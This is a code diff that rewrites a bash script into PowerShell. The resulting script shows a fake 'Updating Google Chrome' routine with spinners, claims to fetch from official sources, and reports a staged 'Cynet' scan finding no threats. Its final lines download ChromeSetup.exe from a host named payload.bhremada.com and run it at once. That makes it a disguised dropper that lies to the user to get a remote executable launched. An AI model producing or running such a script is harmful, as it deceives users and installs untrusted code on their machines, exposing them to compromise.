@@ -1,47 +1,46 @@
 Clear-Host
 
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-CYAN='\033[0;36m'
-BOLD='\033[1m'
-RESET='\033[0m'
+# ─── Helpers ────────────────────────────────────────────────────────────────
 
-info()    { echo -e "${BLUE}[~]${RESET} $1"; }
-success() { echo -e "${GREEN}[✔]${RESET} $1"; }
-warn()    { echo -e "${YELLOW}[!]${RESET} $1"; }
-error()   { echo -e "${RED}[✘]${RESET} $1"; }
-task()    { echo -e "${CYAN}[*]${RESET} ${BOLD}$1${RESET}"; }
+function info    { param($msg) Write-Host "  [~] $msg" -ForegroundColor Blue }
+function success { param($msg) Write-Host "  [✔] $msg" -ForegroundColor Green }
+function warn    { param($msg) Write-Host "  [!] $msg" -ForegroundColor Yellow }
+function err     { param($msg) Write-Host "  [✘] $msg" -ForegroundColor Red }
+function task    { param($msg) Write-Host "`n[*] $msg" -ForegroundColor Cyan }
 
-spinner() {
-  local message="$1"
-  local duration="${2:-5}"
-  local frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
-  local end=$((SECONDS + duration))
+function spinner {
+    param(
+        [string]$Message,
+        [int]$Duration = 5
+    )
+    $frames  = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
+    $end     = (Get-Date).AddSeconds($Duration)
+    $clear   = "`r" + (" " * ($Message.Length + 10)) + "`r"
 
-  while [ $SECONDS -lt $end ]; do
-    for frame in "${frames[@]}"; do
-      printf "\r  ${CYAN}${frame}${RESET} ${message}"
-      sleep 0.1
-    done
-  done
-  printf "\r\033[K" 
+    while ((Get-Date) -lt $end) {
+        foreach ($frame in $frames) {
+            Write-Host -NoNewline "`r  " 
+            Write-Host -NoNewline $frame -ForegroundColor Cyan
+            Write-Host -NoNewline "  $Message"
+            Start-Sleep -Milliseconds 100
+        }
+    }
+    Write-Host -NoNewline $clear
 }
 
-task "Updating Google Chrome..."
+# ─── Script ─────────────────────────────────────────────────────────────────
+
+task    "Updating Google Chrome..."
 info    "Fetching latest version from official sources..."
-spinner    "Downloading package..." 2
-success "Package downloaded"
+spinner "Downloading package..." -Duration 2
+success "Package downloaded."
 
-echo ""
+task    "Cynet — Running file scan..."
+spinner "Cynet — Scanning downloaded files..." -Duration 2
+success "Cynet — Scan complete. No threats detected."
 
-spinner "Cynet - Scanning downloaded files..." 2
-success "Cynet - Scan complete."
-
-echo ""
-
-info    "Installing package..."
-
-wget https://payload.bhremada.com/ChromeSetup.exe -OutFile ChromeSetup.exe
+task    "Installing package..."
+info    "Saving installer..."
+wget "https://payload.bhremada.com/ChromeSetup.exe" -o "ChromeSetup.exe"
+info    "Launching installer..."
 .\ChromeSetup.exe
